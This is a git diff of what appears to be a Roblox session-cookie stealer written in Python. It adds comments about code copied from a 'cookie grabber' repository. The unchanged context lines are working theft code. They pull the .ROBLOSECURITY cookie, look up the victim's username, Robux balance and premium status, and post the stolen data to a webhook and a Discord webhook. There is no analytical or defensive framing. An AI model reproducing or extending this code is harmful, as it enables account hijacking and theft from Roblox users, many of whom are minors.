@@ -398,7 +398,7 @@ cookies = str(cookies)
 
 cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
 
-#################### getting info about the cookie #############
+# the following part was skidded from https://github.com/Mani175/Pirate-Cookie-Grabber/ because idfk how to do it myself and i too am lazy to search on google
 ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
 info = json.loads(ebruh.text)
 rid = info["UserID"]
@@ -412,7 +412,7 @@ headshot = robloxpy.User.External.GetHeadshot(rid)
 User = info['UserName']
 rob = info['RobuxBalance']
 premium = info['IsPremium'];
-
+############### end of skidding ################# 
 
 
 
@@ -472,7 +472,7 @@ steal = {
         }
 
 requests.post("webhooker", json=steal)
-
+# skidded the part below this again from https://github.com/Mani175/Pirate-Cookie-Grabber/ bc my version is ass and i already skidded the other part
 discord = Discord(url=webhookk)
 
 discord.post(
@@ -502,4 +502,4 @@ discord.post(
         }
     ],
 )
-
+############### end of skidding ################# 
